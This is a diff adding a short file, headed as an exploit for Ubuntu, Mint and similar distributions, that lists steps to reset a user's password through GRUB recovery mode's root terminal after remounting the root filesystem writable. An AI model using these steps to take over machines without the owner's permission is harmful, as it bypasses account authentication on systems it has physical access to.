@@ -1,0 +1,8 @@
+Ubuntu/Mint/etc distros exploit:
+
+1) Reboot grub mode
+2) (Recovery)
+3) Select Root-Terminal
+4) mount -rw -o remount / 		#Remounts the partition with W access
+5) passwd user
+6) Reboot | Done
